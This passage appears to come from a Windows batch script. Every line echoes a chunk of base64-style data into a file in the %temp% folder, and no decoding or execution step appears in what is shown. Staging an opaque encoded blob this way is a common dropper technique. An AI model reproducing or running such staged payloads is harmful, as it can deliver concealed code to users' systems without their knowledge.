echo XHOND7k9I9GRWevg4peOnb3lhuOLD3/onuZnqNDIhv30tUJxf7hUojdAhf3RVPFQ >>%temp%\data_encode.txt 
echo KZffX8Wq7ulEsYSJVZH7c+NX7Of3mNXxPfmJcei+zah8q+5osM6v/7ZKbCySK8Rm >>%temp%\data_encode.txt 
echo U/xZA38kmkr1TGQyevKr54K2BSzQaKL2zeLuje4b7m++v1n3S0Bj4W6l7GaQfqzz >>%temp%\data_encode.txt 
echo ar78hpt+1vmY667n7bC2edsB4p1D+gaUb9v4etu77R+rJdGqfG65MAMPsVdHhgYK >>%temp%\data_encode.txt 
echo rOSgPF+dy/ZePq0EdXhU2zGkeXq8PlAxu+br8XjKwYsuuqjiot9SeWyAqMP2zery >>%temp%\data_encode.txt 
echo Xn2FvAsuehUcijnsk5E7GH4X4O5H4MA2q3WtVbFY1Ls3ezbe7fQssjoQNyvv7kPx >>%temp%\data_encode.txt 
echo +LELzKtfq2EW9X84ZcNqHxTo703EjapPPr7S+Fasnx+ijdS8C9BvgzTWRKotzyhB >>%temp%\data_encode.txt 
echo PF6Uvz95Bdu/ReqkVA5ytYILp/strbjsErzt138HdpSZM+DZsoA5PeZ1lcwJvvuG >>%temp%\data_encode.txt 
echo H9HI0diDRSPvkXv27dyzfWQ0PDq4Uxarj7ttktbKcUfQfu1nn+u6/DHX8U/gGGu9 >>%temp%\data_encode.txt 
echo mwy5gN9y+PADD/cNXrv0S//wi4883iuJ/WZluyt/yhm2exVSo0ifoneZPtb2icDw >>%temp%\data_encode.txt 
echo xLpP/dEjV/1o7Ehe3k+rarMKJtXkYt+R58nySUds18uOX77yrsNXvPDtya7B1YkX >>%temp%\data_encode.txt 
echo PnjoqXe87/u5W5+41HHFja9c+kPiv1X2g8J9YZISxVymE4s2tH+uM+bFSJ1xjL9x >>%temp%\data_encode.txt 
echo UHdFNBRwxFZt156dW/eEhzQUmqDuCA8PhYc5uC+dnUChrU3mChp9QXWwkJvJFzV/ >>%temp%\data_encode.txt 
echo jzeB+Ya8Pb5LeC7pl3irZlsdRmqR7eHT/oSy3Fv4U5lzOLLmyB/DLuHitYpQqj5U >>%temp%\data_encode.txt 
echo J173B1sv/9Qp8j+OfX373QAbTUbKRlMA4V6csWMIY7AHQ/TobBjxQYRx4a0VvmL+ >>%temp%\data_encode.txt 
echo xSu6FK0sUxdYZoAFrIpy3F5+9BSX95r6o3oxTumqUXnfW8T0hPEghH9/bv4IGVOr >>%temp%\data_encode.txt 
echo 8re9sKRZzuMp/wM4oDxsf1hhLbwcP7bTXwaCFMVGWp7rP2Y8GCzTTzqVen3CF3KS >>%temp%\data_encode.txt 
echo 6chX0TmCHKc25he8kCBTxvaKMqofsdKPXk14ygfV6WatwKx8wJTlB98GZaeuq4ef >>%temp%\data_encode.txt 
echo DKRYBlEZO6T/+Ay3Mo/tI8oP4vVkUnlhnAYn+aWKT74sIOuaSlU5oqcm+P000XCo >>%temp%\data_encode.txt 
echo zE1afNysqSjKS0u69XZnXxf9G5nvwjP2BMzwQ/LKvjkdvwPM7+pra7ley/MQXxPm >>%temp%\data_encode.txt 
echo B3gpfviY4VeOr3Xd0x/H/VbFoP/Fg3+58aLZ6Ywmv2jbtBLl1kotJT+I3bTy4tF4 >>%temp%\data_encode.txt 
echo d2ilViwlshOJTC6b2rTyWKq48qLNTY4mx8aE/M5XwyKyxU0rZwrZDcXkVAq3V93T >>%temp%\data_encode.txt 
echo 6WQhV8xNlrqTuekNieJ0zxHvSm06kU1PpoqlvZX1YWGaVi5scCKVLaVLx6poov9K >>%temp%\data_encode.txt 
echo jb5W2bRy6Fg4n8+kk/y9Z08in1+5XpRQKsyILdsZ0uMTNeOVxVRypoB1ShxjCin+ >>%temp%\data_encode.txt 
echo DiY1QZpQ6UzqYKp4hqX6V5ZLqSxHfNisf5qrZQhuWpkoDmaP5HCjulKbSYtvuTat >>%temp%\data_encode.txt 
echo nExkiinZKC5kfR1qdNLXV9G+cX2ZCYhvXK8zdfMbEPlz0r/1RW/luvL73+/q73fF >>%temp%\data_encode.txt 
echo //uDc3/38AL/7+dV+H+PytuyA6/h//3u1+f/3R6V/t+x3Icsp5kfkbfG//uBVbJd >>%temp%\data_encode.txt 
echo 553e/zvTdkA2dPVr+H+fk2X1vLb/943Rav/vdix7dJnYO1n+E/7fySfzYrH3cgln >>%temp%\data_encode.txt 
echo 7w4r2YEXtnit8Buz9DO97JYO4fztTxvIDHd74QE+dxS+weelhe/w+azCj+js6NCz >>%temp%\data_encode.txt 
echo PyCzc7bGd5GfSy5C+1es7Ga6xcq5hDn6RUuaQuRF0N7wYXZt2n7LWcKs9aY7yfCv >>%temp%\data_encode.txt 
echo NMbd8YqiOwbrhMIvsSSXmc1vg/BO3U7OMMlcM1voJp/eulOwNij4HGTyeYmw1w2h >>%temp%\data_encode.txt 
echo vyBP1IiSmXXyl8XEsl/47iBif1rGLkHsOzq2gXwRYsQ3yhE0CUP7uLD2D5fJXifJ >>%temp%\data_encode.txt 
echo Jn8pDaLhVL6rQTQ41CcvIMdg5HjTwSx5xcwutZqgUCKHpNwVYLCNDR+fZ+Auhyzt >>%temp%\data_encode.txt 
echo H1VZmuQxketqFImFl6ndjYUY+WhZKi394zVfktcUtjfKprBvriNQ2Neo1y1Ko7Z2 >>%temp%\data_encode.txt 
echo SlfFbGSZew77VXuvgXSwiWiJLNU2NZWRs7REexlZpo2XkZxwARnq0Cn5ZZkSsmZ/ >>%temp%\data_encode.txt 
echo BRR+fRpKutp0MrradRq6luoEdO0q1/6gUlH77V21tX9YkbVft0iv3eVyCcP7heOL >>%temp%\data_encode.txt 
echo FhLQ1bGQgiVlCtrLFOi0nNUV1KsvU9XZlZWh5V05GTq7krddDZXM7XJot1VgjZVt >>%temp%\data_encode.txt 
echo 6lpUyfmuJu05k4E5tR9XYIu1B60G1qy9sMjAXJVd1uXWFhl91tVSwbZzu1q1fouB >>%temp%\data_encode.txt 
echo tWn7XQa2RPvoMgNr185pqWH32p7688Ttcre0GDx2tUjBsNZVeLqpct6uBWhov6Sp >>%temp%\data_encode.txt 
echo wX5r+qK//XdcBW0trUta2tZucbW62j7cskR0lGtJbpl0UEzOB1BYaGTwfUk9YQGu >>%temp%\data_encode.txt 
echo tvZLyL2aq/XWtO9+vr6lYy24OsgOPtmi36b7rQdym9RJhucrJuVymlNnk48Omz3X >>%temp%\data_encode.txt 
echo xU7qVRNHCAcZ7cI7+RI8SfP6ui+UDReCjYypka39LdLvfdEuzK4LV7vWwpRT+vI1 >>%temp%\data_encode.txt 
echo mMM1lnDSLLO+YiWX1cUVRAJGrD2P/Ut9Q6wH5Csz3f6K2WFFiSLaDKF7+dEBZbae >>%temp%\data_encode.txt 
echo V7gVC68QGW41d45wJoItWSXc0FCW1efqLogX2drJ5rpjjldzQ64ZJJG3Xeva1S6L >>%temp%\data_encode.txt 
echo y/rhFhu4bFwQe4i1QuF2Z1mskVsDkuQk131PvIsKJCP77CCEsdz5nI/sw6/mNSlL >>%temp%\data_encode.txt 
echo 1lYd7Jy9lQkoXkC4SfpVWV32q/IgSH/uwj+08A5tkqfVmN/abSs8hKSstRS+4xRu >>%temp%\data_encode.txt 
echo 9BwOnYRG27ph4Qk+t47twnOCtfATclwgnJL8sHMRFJ5H3J7rYQ+p5Np1tUe6jfqh >>%temp%\data_encode.txt 
echo U17u5YinXxcZ+vorfAvEoe0y6Gxj3wJx8B8Dto1zJjbpNbOwSX8znjss1TbpP4GD >>%temp%\data_encode.txt 
echo ZlTapP91R7VNejvO1h1qHZv0baq91ib9efJ5oEX4guZvbrzyua9VpikVZ7Fl+ryq >>%temp%\data_encode.txt 
echo 255vVZ83WWGe4TblL0yLwc7DJK8MY8xLDH/AcEolGGA4xPB6jt+vPIZwA8MHOeZj >>%temp%\data_encode.txt 
echo yt+pVjhk7sHw0+avko1hUwLL3I738g54p3mj2QoHTJTapVC9fwsU/q1KMMbhI5x6 >>%temp%\data_encode.txt 
echo F5aAm2W4AsPn4rVW+DTGOODnWAK9VCL4K6DS/HxVo6kTwzebCX6Ua/xL+Koqnh5X >>%temp%\data_encode.txt 
echo WlhvNV1jEhbWyc63wtbCzbj7dMG3zX7FBd+CPoQ7zRcqVvg3NYLwC+aIImwevx8+ >>%temp%\data_encode.txt 
echo BnFFgYzErje9DbGStF282XQxjpIfSCxoSmK5q84TtkUHTZdReecJm50nTWSt+FWR >>%temp%\data_encode.txt 
echo 1vFZU1yxwbLzK9NWnS/seS6BhGJj6tvNBL/AO8KNYIS/X5G6z9wAJ01k+5FKWYqQ >>%temp%\data_encode.txt 
echo bD+eNJHtR4L9DMMMBxnuZngpwwRCsv1I4cMMjzH8HJf2ZfgZnI2j/TYYhUdg3ryf >>%temp%\data_encode.txt 
echo Y5LwFFxvTsNz4DdnMf635mvgRYjAdZjz0+pNGHO5+XYMn2saRfgj801wAku7C8Od >>%temp%\data_encode.txt 
echo pk9zzs9jzP1mBWHBfB90YurjsFQxmb6Dee5SX4J5+GcVlEfAbrkG+XjSZFbWKEuR >>%temp%\data_encode.txt 
echo l/NM1Y0MFzF8BCbMLsWr/BivX6P8DJYrJ+EeZMtJeB9CovYc5Ub4Ho4PsuM3qZAd >>%temp%\data_encode.txt 
echo v5xCdvxuVciO3wcUsuN3j0J2/AheyDDC8dvhzxSy40cxlzFMwjcUsuP3S4Xs+L2s >>%temp%\data_encode.txt 
echo JOFK2KqeReXAV+AFcChD8FX4eh3LXFeaqq1rXaAcglqLWxcoPaaFccJphIl9XV+J >>%temp%\data_encode.txt 
echo s+WnfFNSazunl2xMkQ7SCN5UCpNT1UaiwqzAhwHSUSp6y4adqqwtlQ3gGPZfzsS4 >>%temp%\data_encode.txt 
echo C1lzYUMa9NJxtEB2NRaazKiwjlFhvmKy0nxFbqZEONuB0G05GCYcqkwzVJhiqDS+ >>%temp%\data_encode.txt 
echo IMwlvCFLCG+xuYO3zLbB75Ahg9HCsa2p0l5pvWA6dwQ7Tw5N7BA2XbDACMEZ2B6Y >>%temp%\data_encode.txt 
echo ZHVKicRzhVgiOUWKbqRbmzmNFr/U2ddJgMEiBXfmdY37hSrzhm58lbI6qalXNIRU >>%temp%\data_encode.txt 
echo t6XWttBHl7rbpKAng1Vaz3UUmd9ctWPWE67lbM9oonhood5wpfJrgZU2i0I01Civ >>%temp%\data_encode.txt 
echo Sm1VXVFVqpJWKITqHbAjl8tL7c9KhU9dWZL1HqlLpDkLXf2RJvwQDhpSS8ykEkWJ >>%temp%\data_encode.txt 
echo nFrJsFKhEMOD2ZSOkXONTzlQYB/jlzEJmOVPJnP80nsEhTe9NMryKwJDN0jjV0RG >>%temp%\data_encode.txt 
echo iv5Sw9BL8/IHnzrmq8L8jAltNQ3LbNRIX61am03DhSSFNBWrap2SL0KKZe2qhTpn >>%temp%\data_encode.txt 
echo PeWv4en1jdCiyssvz0vys1H9Q1Bd08wot0fqvwkVRdFGjfXSNNb7qv7GXn/ho0l+ >>%temp%\data_encode.txt 
echo 1dOY66mgP8/53nz6jXLXlWnJcd/U6utRz5KGCX2UoH8om+eahVbbJL/Ymil/YKuX >>%temp%\data_encode.txt 
echo bNRZ3SOn+hMPpqXWQjdrHtG33etkqJ9DQgdnHX9S4YeQjA3yV+7BinDvGdR3FOkd >>%temp%\data_encode.txt 
echo l3X5+BNkOvvlWZQW4m/xRb3+ckyoQo/r1P8Sv0jUNasq6/DVrStYUYNotbci5C1z >>%temp%\data_encode.txt 
echo opYn3jJtgaqQyNePf385pF/bV65daA/01uWpR9a/sM212o7drIljvPylV5w9rPeS >>%temp%\data_encode.txt 
echo 4hFTYu1EfVzpuiWir+trShYrZEq15NA1hY6yTkmpIl9CftJd5DGY5fJ6WJvgkgpN >>%temp%\data_encode.txt 
echo S+qPTYxpNTX2nEGvDmPukvwQfQfPiZScV0e41TOyZcVyfadrYaXupmjLUZlXaEIZ >>%temp%\data_encode.txt 
echo epl6q9PMwyyHF9Z4UGocZavaInrJ+Kj9VL0VL+fQOVxgqlJlvgpaiuUy9ZziY/sJ >>%temp%\data_encode.txt 
echo puIQl7WvfK2hhWp8iJ8t91uG21moallWqojTq2r6VGqiLOVGpBwqVo0KIZVeq/cG >>%temp%\data_encode.txt 
echo Kzhn8CItyzJ0atNc27pyG/OypUbPCNmuc6ckNVpEG3WpmZQjMMf19Mg1i/RahDaV >>%temp%\data_encode.txt 
echo qJ204BJSsUHk0MpavvpK4mXdP+MFu5dHelZK9Rzny5TXI2M2VK4ctbJHv16XAke5 >>%temp%\data_encode.txt 
echo JVNyDtXOjNr5Xo/Tp1rdjXVyU52WrKvbAoPyTZJyQbePP4Wr1awN1mjWanCmXNQ5 >>%temp%\data_encode.txt 
echo pZ9LZeMEBufELExzuybKMsvIeep1cGXFiray7rr45vGxmmdGvcriam5Bo1EONBrX >>%temp%\data_encode.txt 
echo wOJqGQFNadkixsKXoQQV6jhZKXXS3MbEgj0Y7TuKUrfTUNYxSrgY8x3iWXiUOXnG >>%temp%\data_encode.txt 
echo JcxdfxkKroXqgqM1S1HtNC1KQwPV01Owh66ckWSUzkBgU4cpWy+DtUzHnhqR+FoC >>%temp%\data_encode.txt 
echo olpkgoVKg0ajs2DuA3rRo6fdexmjc2FjjdEzIW0bvJFdlNhtk3kL2ivB3HvffAJf >>%temp%\data_encode.txt 
echo /9ZLEtVobLBgfvCtJOy/635Nr5c+P9ZroT+F+zC9r8ziENfGbI2caqbm6+jinmKu >>%temp%\data_encode.txt 
echo btXLGOIpVCz3QKHmzqVeqRXlnKvrhm+okp+64p/UtVZgrd77IzU7Rf3+KyNL7wF6 >>%temp%\data_encode.txt 
echo 5yDESJJHh6Bdcekl5HgngJPRlAA4pLcj9rpVC/XJb6gWVu47jDY6ZGvgWy//8L23 >>%temp%\data_encode.txt 
echo tPwqfM/K4y3t77/9mVPrFupqec41tqXLWWfITnpDrAxGP6EqJuLVNveQ6uy0ipOu >>%temp%\data_encode.txt 
echo myf1kyykP9LJGn5SDXCG1QBJRVBoDgo9RKEtJzQTWUNot11tJPW1q11z866566Qi >>%temp%\data_encode.txt 
echo HWXuJBVEJymGuRepy6neuRuVTqGX2IJ1uOaOi1o4Qej5LbI1IG1Ic6e9U7VrKlbW >>%temp%\data_encode.txt 
echo 3KKwziMVRrpJTtV9sa4hyHqNlNAp1aDKykomqzuGx6BNNle1so6Qg/RlCF8uWtUp >>%temp%\data_encode.txt 
echo 1IdYW+Z168M0K9BY+WzqdNowHqENM+71BcaT3snuZHJyvDvQP+npHveEfN2TXn9v >>%temp%\data_encode.txt 
echo IDDZ2+vp7a/RhhlU4KxTasOETqkL416gCxMy68/H/+95HR/QdQToe587Inic+9r6 >>%temp%\data_encode.txt 
echo L4XSqm9eNr92+y2XDjnCv/z10VPov+SOZjO5xERxfwVzdP2XOlGGEkzlE0tSgfFE >>%temp%\data_encode.txt 
echo jfrfFj21CszG6JmqwAj9l9///jv9/mu//3+Ivv8/ALCu4vv/db/j3//ffAbf/0+9 >>%temp%\data_encode.txt 
echo Rd//b4FFZ/T9/y65ZFcvy6//2/8t7LPp1N/+16/nzf3u3/M6v/vfxjS/9nf/r0V7 >>%temp%\data_encode.txt 
echo iHl96m/+T8Xj/8rv/R9P/v57/99/7/8Gf1vk982B369+/z/+ZsiOqibeml7Y5KhE >>%temp%\data_encode.txt 
echo T/XetjZbtJA4iugponsGpxMH6yTX+dKinGVIn4c9e9PFmURmIFHkVPqvX79e21XI >>%temp%\data_encode.txt 
echo HUlP4ByenMmKIrRSTksm8uSBQitNpTQSOhgsJnFHml2n5QpaQssnCqV0kmxGa0dZ >>%temp%\data_encode.txt 
echo dXOdhnJQKyaOpLR0iUpIaPS+tkejevIz4yiVNLbFrI1wORFRQZPjSspA85WIiRRS >>%temp%\data_encode.txt 
echo iRLSkshq1NSUluN3ylpSvOOl9iQkIVpxKldi+sibD1Yr6ND04mSdohhZW5hzCl3T >>%temp%\data_encode.txt 
echo 1WtEvisNkVRIYaasnllmo7sEv6+HHMTglpz0UrMTeglrLhQXX/2G2pCb1P4DZ/pW >>%temp%\data_encode.txt 
echo fgEnAIBDS+w9W2wkx3F79Bk40z7phEiA8oJba55uV94dLnlnRyHFc/i6I3V8mUvq >>%temp%\data_encode.txt 
echo HhTNzO7M7o44uzPamT2SZxM2cBEC4nCAgvjPPw6CwMifAxiJEQfCIQqgnxgxAuQB >>%temp%\data_encode.txt 
echo 5MdBEISG9BEEiSAYBpiq6p6Zntfu8nEJAoQSj7sz3dVV1d1V1VXV3RKbNb4Nvysd >>%temp%\data_encode.txt 
echo nIXHp0Bs8T9z9OGBrVeNGuAZ7QV+O1YYfdE+TIUVt80alN4TpwVwqevQwzprzEx7 >>%temp%\data_encode.txt 
echo TOJHVweteIU9WFq13K6yCRbQzBubmc6JdsbjLQBcvAdDAieqr85Or4m2VpEHE6yl >>%temp%\data_encode.txt 
echo 78gvczK4aJtYRbRagJ6pSZDkakYL6dHcBoAPSih8GV6UH5l6zY1UbOhULFSzYrmu >>%temp%\data_encode.txt 
echo 1QxXhV4PE16lboae03QURNS9+i5gouNeI/hq7+EsTuIwjCJs8ebMPFDLh4uX3WPq >>%temp%\data_encode.txt 
echo yGjqhHxKexXDbap2qB0SGAUWKs+FF41ZxA9GDsklr7+IYcOC+jiSU7yRNCT5a4Fo >>%temp%\data_encode.txt 
echo gQMrCF5G8HZ0lKzUpsBczId4o8um5rdYpmo8IyYneFbw8Io0AXArJswjsOokqBwO >>%temp%\data_encode.txt 
echo VJgyJQgl+j+EcIF5dPCXAoHV6enllbuRptoAxEJZrgt9EWswBXGgLdqhpg7917Fj >>%temp%\data_encode.txt 
echo EGYAgivGAdZOmCIif8eflB4JCZNTZeQQMmRRhIcEGKEeoLdGsw78p88KXYVVEd2c >>%temp%\data_encode.txt 
echo yHW8PgLRx56dSulZmSCPJXFgQuhC81F5KmT3fcvQklTQmoWpfTl+Nw6pSzTjC5wE >>%temp%\data_encode.txt 
echo nlTFeCZbXDrKJCdqN1lQNOtKGTRzLmhCgO0DYa5rzhhVT4GdCEmHrnlkFcsywWgx >>%temp%\data_encode.txt 
echo TaGMJhgY+Pp4qEw5wBfeZ3lJ1FpKpWlnI2UTTS0lTiFA6l1WmWraibhwoUzpoYhS >>%temp%\data_encode.txt 
echo djxCFvGebvTwL5lIUPQc2MYm8++fAGBSMh1qIXGpG2bE4t0gYW7XWM6vqizQfUts >>%temp%\data_encode.txt 
echo YoKN5IMyUnNClbdcvIwjBAh/5HYx0S9Xkkvsp7S6MbKpiJtncnmF31mSyw43snn2 >>%temp%\data_encode.txt 
echo jW+wnsUAkWz+qWAbfBHjRsZFKhrkQ7/Gu6PQx7i4LgYR9FcACa2Kk0Ej6iSEOWxl >>%temp%\data_encode.txt 
echo UtNyWRzi/QDBoSqzIAREb9b6AzLbrKUD2TX6hQIlU8G8Zdf7g/K6rde7QNHPAky9 >>%temp%\data_encode.txt 
echo X5JudqHIbvWJykorHRPXqPWJyhqUTAWz029P3+Y9LY87IdvQgBQyTZ7ytBDEu07E >>%temp%\data_encode.txt 
echo DXO5K8qVPLvOil2kDQdFNYPZ718klwLyi2ykwOsIiVZkyQWLIOiSRZRuOnoqUmL3 >>%temp%\data_encode.txt 
echo geLvNMhl51v3VRMkNokKVFsAu2Uh+vyepWxP8fMbqeLHbe+louKrItGHG9DiZjJJ >>%temp%\data_encode.txt 
echo Vbxej+X8eCDT88ehcKVtVVR0Ze4A2kKX8kbHssBxaDdKYhwIdiIfI8GqM5Uhr8YY >>%temp%\data_encode.txt 
echo 0kNvXWej6RSF9W0gykc3I3iETAlyNCb1y36iug6UTcIyFi3ltsNdKd6wAPMTlmi0 >>%temp%\data_encode.txt 
echo 8qT9GTR0YvOJv8OwaB/afaMkUxSqGnyRphAsFaTnnJUy5xOGAmdPva1WsOeznpfI >>%temp%\data_encode.txt 
echo 8QhB3oFtHnfKeL4hJ+wcyvZor9d72jo01qsUI2SjuHtmJmNXbgdD5AoB+0zfUILv >>%temp%\data_encode.txt 
echo aFEmwToFeT6KRWIpzbydhi7ccoLfnqduxzBNPB8E2az1ZAn+qKYJclWILn9kOjBH >>%temp%\data_encode.txt 
echo sEUwCgqg0wuokQugwwrzVatVQJVYAGVUQFVSAE3Qsw8lhgBUowXqRdXQneMj3oAa >>%temp%\data_encode.txt 
echo HjV7Vof8Ajbe28VHihhCfZG0Y4A4UJlLre00DJB7xBe7A+trmHRWtePQYKTGXV3r >>%temp%\data_encode.txt 
echo iT49v4Gn0kl0+FiiP9NqgWzk/dN2YI0Atly1oeL9bXrb6Q/+fI1pVuuKy3ZUTjUA >>%temp%\data_encode.txt 
echo aNV5N1f5XWeRCRW0/Gb2zWAgRRdyspDCxIIE+SSW5GXdBUGPUZaZlfnJHRgDIcM5 >>%temp%\data_encode.txt 
echo +BRdmkiFQp5d6FHhLws9jq1CXpLk7ssvs5ckee1b+90M/ZCSFO/DD4SPRm/za9+V >>%temp%\data_encode.txt 
echo SdumpbLq6jmptaheSpOBuuuibMb5L+sWlAbeEIsp/f3w164aOYHGXprZRaFwxUHD >>%temp%\data_encode.txt 
echo Q4wP09jWoyj2R2A3VZ2orn8zgVi5C/b7M2jIUPSHwon4saZuc/e0J1qE0zgkYWB2 >>%temp%\data_encode.txt 
echo IV9Q6CWR51SVJMcHFo86JFI6N2xBnh778MTvG/0ER1OfRJyd6Tjd0Kvb2LOkYvCC >>%temp%\data_encode.txt 
echo Z2Y4jBvMaVT0PyL3E6IX/LJQEWmSQhY3NePqKJtcmZfCXNEYBa9EPj9fSkpyT8Sw >>%temp%\data_encode.txt 
echo 8GpGcr0LDysIudJuqTQ9XSqNlsbRs8h9tkzbWbVsFJegwd2Qa3djxjTnm7iFEpaR >>%temp%\data_encode.txt 
echo iBjmeWXzm7HGhPhG3dxucYeXcAj7PmfyShYIodYd7qylz3fps8xaenybe47p85xw >>%temp%\data_encode.txt 
echo H4dhla1Ou6rHa94hFzOH7X8kGuU+OSFpAoUUP72H4Mx0QaYihuJczIF/tujMTEuo >>%temp%\data_encode.txt 
echo nEEz1KG+u/xpgRaO63Avnx2TQgEDuaeSG5SUQ7f5yq2SviYsLxqzazZAZHSq7oIK >>%temp%\data_encode.txt 
echo xpqb439ugTQES+ftDsZaVTORRKzEMLaX7lrkRXHIRSJykbfhoFvkJcX30l/zIF7y >>%temp%\data_encode.txt 
echo gl7usA43347TY/FA8PhZwvYDrt4AuN3SzrCFIHYkwQ9GW/rsOQ01q/LgpvYwnkvh >>%temp%\data_encode.txt 
echo 4XaX2XSyJuN5BmcAnjRWuo0Po2t/6IYIk5TDYZKLg5OaVsQDNFjRO+aBHAveveL8 >>%temp%\data_encode.txt 
echo 7G4F3YMOL+ymFhaOxYuDX2A3VbRbxfIAQ5OWSWlggCu3UeDzxcGhsueT2UhqT+EP >>%temp%\data_encode.txt 
echo 54Mqm2NjbxhtF1YOvCaAuC3C6wKWQt/h+ZwXPfde8AfwZgEmtvQcv8LTNcuWHsI3 >>%temp%\data_encode.txt 
echo JINrCS86zOPWlKpg2UWUD7Te5NO5yIP6Fexb4NRQxQtTL+k7RS4now5YEZocEop7 >>%temp%\data_encode.txt 
echo yMPQb/dmW7VhoeuI6CVArfMnEsc8YF5ZYBEGSMmpmxNY5Ammv3YTnBOwFNwYgFVE >>%temp%\data_encode.txt 
echo 4I74A9gAC7ywswCj4P3VBAuDeWiuopHn08pDfDTS8t3SpaSTL6KvQt3ff5rVxUGu >>%temp%\data_encode.txt 
echo LugNmrO39D2H0o9CKsU3727Pbd2avTu1PLk6s7WwAMwcuTqeWnYRy84s317i1uBI >>%temp%\data_encode.txt 
echo qRQpKybjgrVDSY7QdsVS2xpOR7Zl478TbM6ytqdV06yo1e3k6kJGbDWg5PwMBrvp >>%temp%\data_encode.txt 
echo gXIPaB0//tI/gAOSAVvPESqyuJHzSYG34XyXFtYX3YHVZ3dzAmTcH5FIiNdsIlsI >>%temp%\data_encode.txt 
echo lRjOvLdzQo6hd8T7OMHEJ/KOcq+JeJKT/QdhCPwYI4QjPk1IMBVkHH+evu4R4f+y >>%temp%\data_encode.txt 
echo pys8VoQHUIHoKcRXbIAsb4Efc5TzMVH4HxSeeZhh3VY+Hnc10I11Srfi/E3iay6c >>%temp%\data_encode.txt 
echo QNSatjTdV587eERL0/9q0tcgxJjci/K4PQH0WBejJ4Aqsuswm9ApxCtifFoo4Xww >>%temp%\data_encode.txt 
echo 49I7BhG4v02AJmAKtJ2GaiqruqrRcVa5gLjuy88cCoo8B5QSNPLT7kxzCfRteC4U >>%temp%\data_encode.txt 
echo PC545Icb9jsxRbMXGB4mBKMLsyf4J2Wyg/lS8AkDW7PtttUW2Q+eGRDpqKjFHhmp >>%temp%\data_encode.txt 
echo yChDwy/S+Eyck6ZdawW2FgzQAuvwdSA/RGheCwbLWdKzwTk85nXjpJNbbzXVFugv >>%temp%\data_encode.txt 
echo DQ0TZQrWO92JpxVRksjyqGlsPx3cu/ZFZMgEuBSk+RNLNesxTWXst6Ex3Xxq+Eel >>%temp%\data_encode.txt 
echo l0gQMm1JeAFe+2E1fQxt32fedFejwD/gahxTnhuuaztjw8MV06o7StPRWoq/V0Gp >>%temp%\data_encode.txt 
echo Ws1h1+pUhkdLpS8Pl740XLo6bFo7RdqUUGxaMBiKOISKRqtYHUaGY4DGsdWqzlY6 >>%temp%\data_encode.txt 
echo baO255sU3NwQZ43Fl6fHG2H9Lh9uGP6qQXQF/KFj/5YopSp4yEt5HXTa5QXNruTl >>%temp%\data_encode.txt 
echo 0o6/XELzFpdLaqtunkmrfFHT0sTBgeEVGr5cdOpCQnlThr7ERX/qlJFxSCC5jIFY >>%temp%\data_encode.txt 
echo 0hh4rpqPgHg2J7Ibsc1mRH2ctMWbfbVoddyzajWY6WVXE9OcUo9j+dRd5E4X+dJb >>%temp%\data_encode.txt 
echo RtJCZw2Ix6Svq6Pllmrj4jQnVM8NU607omfdxtVRYbwFVmjfhHfRHALo1dEbGOXz >>%temp%\data_encode.txt 
echo 2e7hwkf4yury9Gy5PLu0tnr36ihIQfv4zO8HB9QYp0fhtIrtDAwNz8hYRMF6DAvj >>%temp%\data_encode.txt 
echo aZFzLDvj1LbG/0qnHNPi6Mfq6GP+Pw1K+rQ9Un285C3p7eMlV9DXMRl9nDn4z35q >>%temp%\data_encode.txt 
echo UfQP9VdylRxB/ZWd4vs5UgrvJ1JI7PJWxtBR0lrYe2rzv93XTzavauDOhtJ4wnsO >>%temp%\data_encode.txt 
echo hBcQX5R5LVKSZvDa3NXR6fJWeWlyRQgpqDI6Ho3WDw+zNXUbulyINQyDCsC6kzgu >>%temp%\data_encode.txt 
echo fQmIoytNV8RbF2vqeBRaghfysPSOSYt1YKtjmkkxcflBRE4jhbQ/l6dMhN/GUpi9 >>%temp%\data_encode.txt 
echo 0oq2g+42qES6MO8tcvHhci2HXlirlgsDiwX1geG4KObpK3FuRBRfRN14mOSRV5Q0 >>%temp%\data_encode.txt 
echo d0ouRTDDo2JBqbetTr3Bs55E8+GSmtWzVQA2X2OGe8VhaAgDrBZTnW3aTNLcEwNd >>%temp%\data_encode.txt 
echo iddDHsijfCLgftjYiFdNwEJk0PhzClViPgxQnqzzMwkx/v2uTNtpoBc/JzUinChh >>%temp%\data_encode.txt 
echo 6yGtH/Pj/oBoQbmk+RGAvg5TqN/ulpxz4uPU3rwWADuLrIq+RlZoKh43SujrI1Ih >>%temp%\data_encode.txt 
echo 4ZnVS5kIOwYn53h6gWrLpbTGLkVC4y65nBCNWHJGr6kd053TVTuttA+Va86uxQA/ >>%temp%\data_encode.txt 
echo bok5vTDsOpAl/WZXV9oGrVGnVKcb3cLUj5TYSLXV9t5QzTXoYDAzgOfT5K4HlfPl >>%temp%\data_encode.txt 
echo ktylYcOAFscPZnd1jFCk5WUL9SpCvBHNKL0UGzFT37dF9CnltcljUKXxhLYDt74j >>%temp%\data_encode.txt 
echo 7QTqosw1w8HD67/aMarbs5rhxnSKyKyWNwOV8kmTLH1nTe/dNYmq0Gt5oyTt9MH2 >>%temp%\data_encode.txt 
echo s8VGVuwFSnxp6na2t/w5e3yhbxy9arU0DDoUR8Z7JyTG0rT86gBMoZPhPRYcP3Ww >>%temp%\data_encode.txt 
echo z/wybmNz9YBJnDjUW51mRW+zMZb9YkrziTwa6atPPSIjGz1SWFI2dR1TQRzTSxvl >>%temp%\data_encode.txt 
echo Dzwwr4yUSqUk7Lg0QiNBVOQPcsHHsqvCksQxFQdBJmY1Qm2FF+uRzdhn3KxX7KzP >>%temp%\data_encode.txt 
echo +Fm0O1Ev39L3cvkeoim6KyHK8BNtSjibjQkn35zAiuxa3GKPj3QJOqXot4xajVNK >>%temp%\data_encode.txt 
echo /luKxxNv+EMSs1XoqW1Wtay2ZrTw/AOwEI0mLTybNtUweDYmL7ijOpjKbmgiR5vj >>%temp%\data_encode.txt 
echo kO0dTErastDP7oC+KN3wZpxrAYYgJzb7aQesYq8eZf6P8JR5AoDW8X39vt7Opo44 >>%temp%\data_encode.txt 
echo cagHn6xd15I0+xadhJWk0L/ejCfHpdNbZAQAm053qSnva6Zaud7QuexQCKmc2zAc >>%temp%\data_encode.txt 
echo RbR3YjWS8DGSFxD4wbokBUj1eiQEJJeORt2DRqWQewJTTh96P5Pwe3fbPykMv7i8 >>%temp%\data_encode.txt 
echo Xp7tFoM/aRw+vV/TIvE+r3PHCL6neMO6h9+PH4JPScoPheLjvCOKRADGUW4vbi1M >>%temp%\data_encode.txt 
echo ra+tLS/xbBhY4YYK5HeiLaZ052J5YWFueflWeW11fXqN4QDnSzVcNIdf+m4PoIgy >>%temp%\data_encode.txt 
